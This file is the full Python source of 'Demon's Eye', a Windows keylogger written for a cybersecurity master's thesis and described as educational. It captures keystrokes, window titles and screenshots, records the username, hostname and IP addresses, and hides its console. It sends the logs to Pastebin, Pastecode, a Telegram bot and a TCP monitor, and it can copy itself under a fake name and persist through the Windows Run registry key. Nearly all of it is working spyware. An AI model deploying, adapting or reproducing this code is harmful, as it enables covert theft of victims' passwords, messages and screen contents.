#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# -----------------------------------------------------------------------------------------------------------
#    ____                             _       _____             _  __          _
#   |  _ \  ___ _ __ ___   ___  _ __ ( )___  | ____|   _  ___  | |/ /___ _   _| | ___   __ _  __ _  ___ _ __
#   | | | |/ _ \ '_ ` _ \ / _ \| '_ \|// __| |  _|| | | |/ _ \ | ' // _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
#   | |_| |  __/ | | | | | (_) | | | | \__ \ | |__| |_| |  __/ | . \  __/ |_| | | (_) | (_| | (_| |  __/ |
#   |____/ \___|_| |_| |_|\___/|_| |_| |___/ |_____\__, |\___| |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|
#                                                  |___/                 |___/         |___/ |___/
# -----------------------------------------------------------------------------------------------------------
# Name:             demonseye.py
# Purpose:          ES - Desarrollo de un keylogger para el TFM del Master en Ciberseguridad de La Salle 2019
#                   EN - Development of a keylogger for the TFM of the Master in Cybersecurity of La Salle 2019
#
# Author:           Gabriel Marti Fuentes
# email:            gabimarti at gmail dot com
# GitHub:           https://github.com/gabimarti
# Created:          19/05/2019
# License:          GPLv3
# First Release:    04/09/2019
# Version:          0.0.2
#
# Features:         * Record keystrokes
#                   * Periodic screen capture
#                   * Send data to a remote computer with Monitor App
#                   * Paste data to a Paste service
#                   * Send images and paste urls to a Telegram private Channel with a Telegram Bot
#                   * Self replicate and install on Windows Registry to maintain persistence
#                   * Two methods of keystroke capture using different modules
#
# Build info:       For required modules and executable generation, please read the files in the /docs folder.
#
# Notes:            This code has been tested, developed and designed to work in a Windows 10 x64 environment.
#                   Its purpose is only educational.
# -----------------------------------------------------------------------------------------------------------


import config_gm as config
import argparse
import base64
import datetime
import getpass
import glob
import json
import logging
import mss
import os
import platform
from pynput import keyboard
import pythoncom
import pyWinhook as pyHook
import requests
import socket
import sys
import tempfile
import threading
import urllib.parse
import urllib.request
import win32console
import win32gui
import winreg


########################################################
# CONSTANTS
########################################################
APPNAME = 'Demon\'s Eye Keylogger'      # Simply a name
VERSION = '0.0.2'                       # Version
LOGGING_LEVEL = logging.DEBUG           # Log level. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
LOG_FILENAME = 'DEKlogger.log'          # File name for the Log Level registered data (not keystrokes logging)
CRLF = '\n'                             # Line Feed
KLGPRE = 'klg_'                         # Keylogger file name prefix (keystrokes logging and executable replicate)
KLGEXT = '.dek'                         # Keylogger file extension for data file
SCRPRE = 'scr_'                         # Screenshot file name prefix
SCREXT = '.png'                         # Screenshot file extension
KEYCODE_EXIT = 6                        # CTRL + F : special combination to close / deactivate keylogger
PYNPUT_CTRL_EXIT_CHR = 'f'              # CTRL + char : special combination to close using pynput
KEYSTOSCREENSHOT = 100                  # Screenshots every x Keystrokes (default value)
KEYMINCHARS = 30                        # Minimum key buffer size to dump data to disk.
FILESIZETRIGGER = 4096                  # Default keylogger file size trigger to send data

# Server constants
SERVER_IP = ''
SERVER_PORT = 6666
SERVER_BUFFER_SIZE = 2048
SERVER_MAX_CLIENTS = 5
SERVER_ACCEPT_TIMEOUT = 0.1
# Message received to identify the Monitor.
MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='
DEMONS_EYE_ID = 'D3Y3K3YL0G'            # Identifier for the monitor to recognize the keylogger
DEFAULT_MONITOR_PORT = 7777             # Monitor port where to send data
MONITOR_SOCKET_TIMEOUT = 3              # Timeout socket connection
MAGIC_RESPONSE = DEMONS_EYE_ID + ' ' + APPNAME + ' ' + VERSION
ENCODING = 'utf-8'

# Hooking method
HOOK_PYWINHOOK  = 0                     # Module PyWinHook
HOOK_PYNPUT     = 1                     # Module pynput


########################################################
# GLOBAL VARIABLES
########################################################
key_counter = 0     # key counter
old_event = None    # Previous event control. Used to detect when the user changes the window or application.

# Character buffer. Until it is full, it is not written to the file on disk, in this way continuous writes to disk
# are avoided for each key pressed. When the args.keyminchars limit is exceeded the buffer is written to disk.
key_buffer = ''

# Path and file name of keylogger data file. The name is assigned in the create_keylog_file() function.
# Also use the constants KLGPRE and KLGEXT
keylog_name = ''

# Threads control
threadLock = threading.Lock()
threadList = []

# TCP Server control
server_has_client = False                       # Client connected ?
client_thread = None                            # This is a thread object of Client
server = None                                   # Server object instance

# Send to Monitor control variables
monitor_soc = None                              # Socket that controls communication to monitor
monitor_enable_send = False                     # Enabled? It could be avoided by checking only if the socket exists.
monitor_ip = None                               # Destination IP
monitor_port = DEFAULT_MONITOR_PORT             # Destination PORT

hm = None               # Global Mouse and Keyboard Hook for pyWinHook
key_previous = None     # Previous key, used in pynput


########################################################
# CLASSES
########################################################

# Threading class to capture screenshot and send to remote services
class ScreenShootThread(threading.Thread):
    def __init__(self, screen_filename):
        threading.Thread.__init__(self)
        self.screen_file = screen_filename

    def run(self):
        logging.debug('Guardado captura {}'.format(self.screen_file))
        with mss.mss() as sct:                      # Take a screenshot using MSS module
            self.screen_file = sct.shot(mon=1, output=self.screen_file)
        logging.debug('Fin captura {}'.format(self.screen_file))
        telegram_bot_image(self.screen_file)        # Send screenshot to Telegram bot


# Threading class to listen Monitor petitions and create client parameters for response and send data to monitor.
class ClientThread(threading.Thread):
    def __init__(self, conn, ip, port):
        threading.Thread.__init__(self)
        self.conn = conn
        self.ip = ip
        self.port = port
        self.response = base64.b64encode(bytes(MAGIC_RESPONSE, ENCODING))

    def run(self):
        global monitor_ip, monitor_port, monitor_enable_send

        logging.info('Recibida petición de Monitor desde {}:{}'.format(self.ip,self.port))
        data = self.conn.recv(SERVER_BUFFER_SIZE).decode(ENCODING).rstrip()     # Process data / message
        logging.debug('Se ha recibido: {}'.format(data))

        if data == MAGIC_MESSAGE:
            logging.debug('Mensaje correcto. Conexion establecida. Respondiendo {} {}'.
                          format(MAGIC_RESPONSE, self.response))
            self.conn.sendall(self.response)
            logging.debug('Voy a iniciar conexion a {}:{}'.format(self.ip, monitor_port))
            monitor_ip = self.ip                # Set data for reverse communication to the Monitor
            monitor_enable_send = True
        else:
            msg = 'No tiene permiso.'
            monitor_enable_send = False
            monitor_ip = None
            self.conn.sendall(msg).encode(ENCODING)
            logging.debug('Respondiendo {}',format(msg))

        self.conn.close()


class ServerListenerThread(threading.Thread):
    def __init__(self, ip=SERVER_IP, port=SERVER_PORT, buffer_size=SERVER_BUFFER_SIZE):
        threading.Thread.__init__(self)
        self.name = APPNAME
        self.ip = ip
        self.port = port
        self.buffer_size = buffer_size
        self.client_threads = []
        self.server_socket = None
        self.server_shutdown = False  # When the server is killed it is set to True

    def stop_server(self):
        self.server_shutdown = True

    def run(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.ip, self.port))
        msg = APPNAME + ' ' + VERSION + ' : Iniciado servidor en ' + str(self.ip) + ' puerto ' + str(self.port)
        logging.info(msg)

        self.server_socket.settimeout(SERVER_ACCEPT_TIMEOUT)
        self.server_socket.listen(SERVER_MAX_CLIENTS)  # 5 clients are more than enough.

        while not self.server_shutdown:
            try:
                (conn, (ip, port)) = self.server_socket.accept()
            except socket.timeout:
                pass    # Ignore timeout, next accept
            except Exception as e:
                logging.error('Error recibiendo datos de cliente. Excepcion {} '.format(e))
                break   # Possibly closed server
            else:
                client = ClientThread(conn, ip, port)       # Starts client response thread
                client.start()
                self.client_threads.append(client)

        # Make sure the server is turned off.
        try:
            logging.info('Shutting Down Server')
            self.server_socket.shutdown(socket.SHUT_RDWR)
            self.server_socket.close()
        except Exception as e:
            logging.error('Server already closed. Exception {}'.format(e))


########################################################
# FUNCTIONS
########################################################

# Send data to monitor (realtime typing sending)
def monitor_data_send(data_to_send):
    global monitor_soc, monitor_ip, monitor_port, monitor_enable_send, keylog_name
    # Can send?
    if monitor_enable_send and monitor_ip is not None and monitor_port is not None:
        try:
            if not monitor_soc:     # Open connection to monitor if not connection exists
                monitor_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                monitor_soc.settimeout(MONITOR_SOCKET_TIMEOUT)
                monitor_soc.connect((monitor_ip, monitor_port))
                logging.debug('Created new Socket')

            data_to_send = bytes(data_to_send, ENCODING)        # Send Data
            monitor_soc.sendall(data_to_send)
            logging.debug('Sended :{}'.format(data_to_send))
        except Exception as ex:
            logging.error('Error sending data to Monitor to {}:{}. Exception : {}'.
                          format(monitor_ip, monitor_port, ex))
    else:
        if monitor_soc:     # Close connection if not enabled Send
            try:
                monitor_soc.close()
            except:
                pass


# Kill Server and associated clients : This function is maintained, but not used.
def kill_server_clients():
    global server

    if server is not None:
        try:
            server.stop_server()
        except Exception as e:
            logging.error('Error Stopping Server. Exception {}'.format(e))

        for client in server.client_threads:        # Kill clients
            try:
                client.close()
            except Exception as e:
                logging.error('Error Killing client. Exception {}'.format(e))

        try:                                        # Kill Server
            logging.info('Shutdown server')
            server.server_socket.close()
        except Exception as e:
            logging.error('Server already closed. Exception {}'.format(e))

        server = None


# Load a content of keylogger file into a string variable
def load_file(file_name):
    logging.debug('Loading file {} '.format(file_name))
    with open(file_name, 'r') as f:
        data = f.read().strip()
    return data


# Telegram Bot. Get text and chat_id
def telegram_bot_get_chatid():
    response = requests.get(config.TELEGRAM_BOT_URL + config.TELEGRAM_BOT_GETME)
    getme = json.loads(response.content.decode(ENCODING))
    logging.debug('Telegram GetMe: {}'.format(getme))
    username = getme["result"]["username"]
    chat_id = getme["result"]["id"]
    return (chat_id, username)


# Sends a message to a Telegram Bot
def telegram_bot_message(message):
    if config.TELEGRAM_BOT_ENABLED:
        (chat_id, username) = telegram_bot_get_chatid()
        logging.debug('Telegram Bot id: {} Username: {}'.format(chat_id, username))
        message = urllib.parse.quote_plus(message)
        params = '?text="{}"&chat_id={}'.format(message, config.TELEGRAM_BOT_CHANNELID)
        url = config.TELEGRAM_BOT_URL + config.TELEGRAM_BOT_SEND + params
        logging.debug('Telegram Bot sending: {}'.format(url))
        response = requests.get(url)
        content = response.content.decode(ENCODING)
        logging.debug('Telegram Bot response: {}'.format(content))
        return content
    else:
        logging.debug('Telegram Bot Disabled')
        return None


# Sends local file image to a Telegram Bot
def telegram_bot_image(image_file):
    if config.TELEGRAM_BOT_ENABLED:
        logging.debug('Telegram Bot sending image: {}'.format(image_file))
        file = {'photo': open(image_file, "rb")}
        data_chat = {'chat_id': config.TELEGRAM_BOT_CHANNELID}
        url = config.TELEGRAM_BOT_URL + config.TELEGRAM_BOT_SENDPHOTO
        resp = requests.post(url, files=file, data=data_chat)
        logging.debug('Telegram Bot response: {} {} {}'.format(resp.status_code, resp.reason, resp.content))
    else:
        logging.debug('Telegram Bot Disabled')


# Sends keylogger file to a paste service
# : file_name = full path of file to send
# : service = 1 => Pastebin      https://pastebin.com/api        example: https://pastebin.com/tW4Z2KXG
# : service = 2 => Pastecode     https://pastecode.xyz/api       example: https://pastecode.xyz/view/722cfc48
def paste_file(file_name, service):
    paste_service_url = ""
    paste_params = {}
    url_file_pasted = ""
    if service == config.PASTE_PASTEBIN and config.PASTEBIN_ENABLED:        # Pastebin
        paste_service_url = config.PASTEBIN_POST_URL                        # Post url
        # Create parameters structure
        paste_params = {'api_dev_key': str(config.PASTEBIN_API_DEV_KEY),    # Our dev key (see config.py)
                        'api_option': str(config.PASTEBIN_OPTION),
                        'api_paste_code': str(load_file(file_name)),
                        'api_paste_name': str(APPNAME + ' ' + file_name),
                        'api_paste_format': str(config.PASTEBIN_FORMAT),
                        'api_paste_private': int(config.PASTEBIN_PRIVATE),
                        'api_paste_expire_date': str(config.PASTEBIN_POST_EXPIRE)
                        }
        # If not set user and pass an anonymous paste is made
        if config.PASTEBIN_USER_NAME is not "":
            paste_params['api_user_name'] = str(config.PASTEBIN_USER_NAME)
            paste_params['api_user_password'] = str(config.PASTEBIN_PASSWORD)

        logging.info('Pastebin envia: {}'.format(paste_params))
    elif service == config.PASTE_PASTECODE and config.PASTECODE_ENABLED:    # Pastecode
        paste_service_url = config.PASTECODE_POST_URL                       # Post url
        # Create parameters structure
        paste_params = {'text': str(load_file(file_name)),
                        'title': str(file_name),
                        'name': str(APPNAME),
                        'private': config.PASTECODE_PRIVATE,                # 1 = private
                        'language': config.PASTECODE_POST_FORMAT,
                        'expire': config.PASTECODE_POST_EXPIRE
                        }
        logging.info('Pastecode envia: {}'.format(paste_params))
    else:
        logging.debug('No esta activado ningun servicio de Paste')

    if paste_service_url is not "":
        # Encode data
        data_encoded = urllib.parse.urlencode(paste_params)
        data_encoded = data_encoded.encode(ENCODING)
        logging.debug('Parametros codificados: {}'.format(data_encoded))

        # HTTP post request
        logging.debug('URL a llamar: {}'.format(paste_service_url))
        req = urllib.request.urlopen(paste_service_url, data_encoded)

        # Get url of file pasted from API response
        url_file_pasted = req.read().decode(ENCODING)
        logging.debug('URL of Paste {}'.format(url_file_pasted))

    return url_file_pasted


# Hide the application window
def hide_console():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    logging.debug('Oculta consola')


# Get the external ip
def get_external_ip():
    service_url = 'https://ident.me'
    external_ip = urllib.request.urlopen(service_url).read().decode(ENCODING)
    logging.info('IP Wan {} '.format(external_ip))
    return external_ip


# Add initial system information to the keylog file
def register_system_info():
    global key_buffer

    key_buffer += '[SYSTEM INFO BEGIN]' + CRLF
    key_buffer += 'cpu=' + cpu + CRLF
    key_buffer += 'os=' + operating_system + CRLF
    key_buffer += 'hostname=' + hostname + CRLF
    key_buffer += 'username=' + username + CRLF
    key_buffer += 'localip=' + localip + CRLF
    key_buffer += 'externalip=' + externalip + CRLF
    key_buffer += 'executable=' + execname + CRLF
    key_buffer += 'extension=' + extension + CRLF
    key_buffer += 'drive=' + driveunit + CRLF
    key_buffer += 'selfpathandfilename=' + keylog_name + CRLF
    key_buffer += 'datetime=' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + CRLF
    key_buffer += '[SYSTEM INFO END]' + CRLF + CRLF


# Save the name of the active window and add it to the keylog file
def register_window_name(text):
    global key_buffer
    key_buffer += CRLF + CRLF + '[WINDOW NAME] ' + text + CRLF
    logging.debug('Window Name : {}'.format(text))


# Take a screenshot, add the name to the keylog file and then start a thread for recording to disk and send
# it to the external service.
def capture_screen():
    global key_buffer, threadList, args
    if not args.noscreenshot:
        tmp_folder = tempfile.gettempdir() + '\\'
        screen_file = tmp_folder + SCRPRE + datetime.datetime.now().strftime("%y%m%d%H%M%S") + SCREXT
        key_buffer += CRLF + CRLF + '[SCREENSHOT] ' + screen_file + CRLF
        pantalla = ScreenShootThread(screen_file)
        threadList.append(pantalla)
        pantalla.start()
    else:
        logging.debug('Screenshot disabled. No capturing')


# Execute the necessary actions to send the keylog file to the different resources or services that have been defined.
def send_keylog_file(keylog_name):
    # Pastebin
    logging.debug('Sending to Pastebin...')
    url_paste = paste_file(keylog_name, config.PASTE_PASTEBIN)
    logging.info('Pastebin url : {}'.format(url_paste))

    # Pastecode
    logging.debug('Sending to Pastecode...')
    url_paste = paste_file(keylog_name, config.PASTE_PASTECODE)
    logging.info('Pastecode url : {}'.format(url_paste))

    # Sends to Telegram Channel the url of paste
    telegram_bot_message('New keylogger paste: {}'.format(url_paste))

    return True


# Delete all temporary keylog files.
# A pattern and a message can be set and reused to erase the screenshot files.
def delete_keylog_tempfile(pattern=None, logmsg='Borrado fichero temporal'):
    if pattern is None:     # If no pattern is received, by default it deletes all keylog files
        pattern = KLGPRE + '*' + KLGEXT

    count = 0
    folder_files = tempfile.gettempdir() + '\\' + pattern
    for file_remove in glob.glob(folder_files):
        logging.info('{} : {}'.format(logmsg, file_remove))
        try:
            os.remove(file_remove)              # Try to remove file
            count += 1
        except Exception as e:
            logging.error('Error borrando archivo {}. Excepcion: {}'.format(file_remove, e))

    return count  # Return number of deleted files (if needed)


# Create empty keylog file
def create_keylog_file():
    global keylog_name, key_buffer

    # Create keylog file in the user's temporary folder
    prefix = KLGPRE + datetime.datetime.now().strftime('%y%m%d%H%M')
    ftemp, keylog_name = tempfile.mkstemp(KLGEXT, prefix)
    logging.debug('Create keylogger file {}'.format(keylog_name))
    f = open(keylog_name, 'w+')
    f.close()

    key_buffer = ''             # Empty buffer
    register_system_info()      # Save system info
    return True


# Empty the keyboard buffer over the disk file
def flush_key_buffer_to_disk():
    global key_buffer, keylog_name

    # Append to file
    f = open(keylog_name, 'a')
    f.write(key_buffer)
    f.close()

    key_buffer = ''
    return True


# pynput | keyboard event hook
def on_press_key_pynput(key):
    global key_buffer, key_counter, args, key_previous

    close_app = False
    # Check exit key combination
    if key_previous == keyboard.Key.ctrl_l and str(key).strip("'") == PYNPUT_CTRL_EXIT_CHR:
        logging.debug('Cerrando aplicación por combinación especial de tecla')
        close_app = True

    if len(str(key)) > 3:       # Special key
        ckey = '[' + str(key).replace('Key.', '') + ']'
    else:
        ckey = str(key).strip("'")
        key_counter += 1
        # If the counter is a multiple of args.keystoscreenshot, do a screenshot.
        if key_counter % args.keystoscreenshot == 0:
            capture_screen()

    if key == keyboard.Key.enter:
        ckey += CRLF

    logging.debug('Key previous {} | Current key {}'.format(key_previous, ckey))

    key_buffer += ckey
    key_previous = key

    # if buffer is full, it empties it and sends the file if necessary
    if len(key_buffer) > args.keyminchars:
        monitor_data_send(key_buffer)  # Sends buffer data to monitor
        flush_key_buffer_to_disk()
        # if the file size has exceeded the limit
        if os.path.getsize(keylog_name) >= args.filesizetrigger:
            keylog_send = keylog_name
            create_keylog_file()  # creates new keylog file
            send_keylog_file(keylog_send)

    # Exit control
    if close_app:
        return False
    else:
        return True


# pyWinHook | Returns if a special key can be saved to the keylog
def save_special_control_key(event):
    switcher = {
        'TAB': True, 'LSHIFT': False, 'RSHIFT': False, 'CAPITAL': False, 'LCONTROL': True, 'RCONTROL': True,
        'LMENU': True, 'RMENU': True, 'LWIN': False, 'RETURN': True, 'BACK': True, 'DELETE': True,
        'HOME': True, 'END': True, 'PRIOR': True, 'NEXT': True, 'ESCAPE': True
    }
    return switcher.get(event.Key.upper(), True)


# pyWinHook | Adds key to buffer
def add_key_to_buffer_pyWinHook(event):
    global key_buffer, key_counter, args
    key = event.Ascii

    # If you want to show the "space" as a special key,
    # you must change the comparison (key <32) to (key <33)
    if (key < 32) or (key > 126):
        if save_special_control_key(event):
            ckey = '[' + event.Key.upper() + ']'
            # With each press of RETURN adds a line break.
            if ckey == '[RETURN]':
                ckey += CRLF
            key_buffer += ckey
        else:
            ckey = ''
    else:
        ckey = chr(key)
        key_buffer += ckey

    # Inc key counter and do screenshot if it's time
    if len(ckey) > 0:
        key_counter += 1
        # If the counter is a multiple of args.keystoscreenshot, do a screenshot.
        if key_counter % args.keystoscreenshot == 0:
            capture_screen()

    # If buffer is full, it empties it and sends the file if necessary
    if len(key_buffer) > args.keyminchars:
        monitor_data_send(key_buffer)           # Sends buffer data to monitor
        flush_key_buffer_to_disk()
        # if the file size has exceeded the limit
        if os.path.getsize(keylog_name) >= args.filesizetrigger:
            keylog_send = keylog_name
            create_keylog_file()                # Creates new keylog file
            send_keylog_file(keylog_send)

    return True


# pyWinHook | Mouse events control. No mouse events are recorded except window changes
def on_mouse_event_pyWinHook(event):
    global old_event

    # If the user changes the window, register it
    if (old_event is None or event.WindowName != old_event.WindowName) and event.WindowName is not None:
        register_window_name(repr(event.WindowName))

    old_event = event
    return True     # IMPORTANT. True must be returned


# pyWinHook | Keyboard events control
def on_keyboard_event_pyWinHook(event):
    global key_buffer, key_counter, old_event, server, hm
    close_app = False

    try:
        # Logging and verbose (for debug) of keystrokes and related info
        msg = 'Time: ' + repr(event.Time) + \
              ' MessageName: ' + repr(event.MessageName) + ' Message: ' + repr(event.Message)
        logging.debug(msg)
        msg = 'Window: ' + repr(event.Window) + ' WindowName: ' + event.WindowName
        logging.debug(msg)
        msg = 'Ascii: ' + repr(event.Ascii) + ' Chr: ' + repr(chr(event.Ascii)) + \
              ' Key: ' + repr(event.Key) + ' KeyID: ' + repr(event.KeyID)
        logging.debug(msg)
        msg = 'ScanCode: ' + repr(event.ScanCode) + ' Extended: ' + repr(event.Extended) + \
              ' Injected: ' + repr(event.Injected) + ' Alt: ' + repr(event.Alt) + \
              ' Transition: ' + repr(event.Transition)
        logging.debug(msg)

        # If user change active window or is the first time, saves Window Name
        if old_event is None or event.WindowName != old_event.WindowName:
            old_event = event
            register_window_name(repr(event.WindowName))

        # If especial key to close keylogger is pressed
        if event.Ascii == KEYCODE_EXIT:
            logging.info('Cerrando aplicación por combinación especial de tecla {}'.format(repr(event.Ascii)))
            key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
            close_app = True

        # Save key to buffer
        add_key_to_buffer_pyWinHook(event)

        # Saves current event info to compare with next one.
        old_event = event
    except Exception as ex:
        print("Exception %s " % ex)

    # Exit control, Disables Hook
    if close_app:
        exit_demonseye()

    return True     # IMPORTANT. True must be returned


# Actions to do before Exit program
def exit_demonseye():
    global key_buffer, threadList, server, hm, keylog_name
    logging.debug('Entering exit_demonseye')

    if args.hookmodule == HOOK_PYWINHOOK:       # pyWinHook
        # Unhooking
        hm.UnhookKeyboard()
        hm.UnhookMouse()
    elif args.hookmodule == HOOK_PYNPUT:        # pyinput
        pass
    else:
        pass

    # Stopping server
    server.stop_server()

    '''
    In principle, it is not necessary to force a kill for clients, 
    but the function is provided if necessary in the future.
    '''
    # kill_server_clients()

    # Do a last screenshot
    capture_screen()

    # Saves to keylog file the Closing Event, Date and Time
    key_buffer += CRLF + CRLF
    key_buffer += '[CLOSING PROGRAM]' + CRLF
    key_buffer += 'datetime=' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + CRLF

    # Empty the key buffer to disk
    flush_key_buffer_to_disk()

    # Send de last keylog capture file
    send_keylog_file(keylog_name)

    # Wait to all threads are finished
    for thr in threadList:
        thr.join()

    # Delete temp files
    deleted = delete_keylog_tempfile()
    deleted = delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura pantalla')

    logging.info('Cerrando')
    logging.shutdown()

    sys.exit(0)


# Add the file to the startup registry key
def add_keylogger_to_startup(exec_name):
    if exec_name == '':
        logging.debug('No hay nombre de fichero ejecutable. No añado al registro.')
        return False
    else:
        logging.debug('Añade ejecutable {} en Registro de Windows para autoejecución'.format(exec_name))
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
        except:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
        exec_name += ' -s'      # adds start option
        winreg.SetValueEx(key, 'DEK', 0, winreg.REG_SZ, exec_name)
        winreg.CloseKey(key)
        return True


# Replicate executable into temp directory and returns new random fake filename
# Note that this is only effective with the compiled version on an .exe
def self_replicate(exec_name):
    if execname == '':
        logging.debug('No hay nombre de ejecutable. No replica.')
        return ''
    else:
        ext = '.exe'
        if os.path.splitext(exec_name)[1] == ext:
            fake_name = tempfile.mkstemp(ext, KLGPRE)[1]
            logging.debug('Replica ejecutable {} sobre {}'.format(exec_name, fake_name))
            with open(exec_name, 'rb') as f_source:
                with open(fake_name, 'wb') as f_destination:
                    f_destination.write(f_source.read())
            f_source.close()
            f_destination.close()
            return fake_name
        else:
            logging.debug('No es un ejecutable. No replica {}'.format(execname))
            return ''


# Return Logging Level
def set_logging_level(verbose_level):
    switcher = {
        0:  sys.maxsize,                # No logging, no print
        1:  logging.CRITICAL,
        2:  logging.ERROR,
        3:  logging.WARNING,
        4:  logging.INFO,
        5:  logging.DEBUG
    }
    return switcher.get(verbose_level, sys.maxsize)


# Parse command line parameters
def parse_params():
    parser = argparse.ArgumentParser(description=APPNAME + ' ' + VERSION,
                                     epilog='Keylogger POC for MCS TFM La Salle 2019 by Gabriel Marti.')
    parser.add_argument('-s', '--start', action='store_true', required=True,
                        help='Specify -s or --start to start Keylogger')
    parser.add_argument('-n', '--nohide', action='store_true', required=False,
                        help='No Hide console. Only for Debug.')
    parser.add_argument('-k', '--keystoscreenshot', type=int, default=KEYSTOSCREENSHOT,
                        help='Number of keystrokes to take a screenshot. Default value: {}'.format(KEYSTOSCREENSHOT))
    parser.add_argument('-c', '--keyminchars', type=int, default=KEYMINCHARS,
                        help='Minimum key buffer size to dump data to disk. Default value: {}'.format(KEYMINCHARS))
    parser.add_argument('-t', '--filesizetrigger', type=int, default=FILESIZETRIGGER,
                        help='File size trigger to send data. Default value: {}'.format(FILESIZETRIGGER))
    parser.add_argument('--replicate', action='store_true', required=False, default=False,
                        help='Self-replicate and permanent install into registry')
    parser.add_argument('--noscreenshot', action='store_true', required=False, default=False,
                        help='Disable Screenshot capture')
    parser.add_argument('-m', '--hookmodule', type=int, choices=[0, 1], default=0,
                        help='Hook module to use. 0=pyWinHook, 1=pynput. Default value: 0')
    parser.add_argument('-v', '--verbose', type=int, choices=[0, 1, 2, 3, 4, 5], default=0,
                        help='Debug verbose to console when testing. Default value: 0')
    parser.add_argument('-f', '--logtofile', action='store_true', required=False, default=False,
                        help='If set, log messages are saved to {}. Default value: 0'.format(LOG_FILENAME))
    args_parsed = parser.parse_args()

    return args_parsed


########################################################
# MAIN
########################################################
args = parse_params()  # Check and parse parameters

# Sets logging settings
log_format = '%(asctime)s %(levelname)08s: L%(lineno)4s %(funcName)25s(): %(message)s'
log_date_fmt = '%d/%m/%Y %I:%M:%S %p'
log_handlers = [logging.StreamHandler()]  # Default Log handler console

if args.logtofile:
    log_handlers.append(logging.FileHandler(LOG_FILENAME))  # If set Log to File (-f)

logging.basicConfig(level=set_logging_level(args.verbose), format=log_format, datefmt=log_date_fmt,
                    handlers=log_handlers)

logging.debug('Command Line settings: Verbose: {} | Log to File: {} | No Screenshot: {} | Key Min Chars {} | '
              'Screenshot every {} keys | File Size Trigger {} | Hook method {} '.
              format(args.verbose, args.logtofile, args.noscreenshot, args.keyminchars,
                     args.keystoscreenshot, args.filesizetrigger, args.hookmodule))

# Init some useful variables
cpu = platform.processor()
operating_system = platform.platform()
hostname = socket.gethostname()
username = getpass.getuser()
localip = socket.gethostbyname(hostname)
externalip = get_external_ip()
execname = sys.argv[0]
filerealpath = os.path.realpath(execname)
extension = os.path.splitext(filerealpath)[1]
driveunit = os.path.splitdrive(filerealpath)[0]

# Hide console Window
if not args.nohide:
    hide_console()

# Delete old keylog files if exists
delete_keylog_tempfile()

# Delete old screenshots
delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura de pantalla anterior')

# Create new keylog file
create_keylog_file()

# Replicate current executable file into temp directory and adds to Windows startup
if args.replicate:
    add_keylogger_to_startup(self_replicate(filerealpath))

# Create server that listens TCP petitions from Monitor
server = ServerListenerThread(SERVER_IP, SERVER_PORT, SERVER_BUFFER_SIZE)
server.start()

# Telegram Bot start message notifying that the keylogger is up and running with user and host
telegram_bot_message('Iniciando {} v{} para el Usuario {} en el Equipo {} {}'
                     'Su IP Local es {} y la IP Wan es {}'.
                     format(APPNAME, VERSION, username, hostname, CRLF, localip, externalip))

# Select Hook modules to operate
if args.hookmodule == HOOK_PYWINHOOK:                   # pyWinHook
    logging.info('Usando pyWinHook')
    # Creates new hook manager
    hm = pyHook.HookManager()

    # Register event callbacks
    hm.MouseAllButtonsDown = on_mouse_event_pyWinHook
    hm.KeyDown = on_keyboard_event_pyWinHook
    # Sets hook for Mouse and Keyboard
    hm.HookMouse()
    hm.HookKeyboard()

    # Wait indefinitely
    pythoncom.PumpMessages()
elif args.hookmodule == HOOK_PYNPUT:                    # pynput
    logging.info('Usando pynput')
    with keyboard.Listener(on_press=on_press_key_pynput) as listener:
        try:
            listener.join()
        except Exception as e:
            logging.error('Excepcion {} en pynput'.format(e))
    exit_demonseye()
else:
    logging.error('Error en parametro hookmodule')      # this should not happen
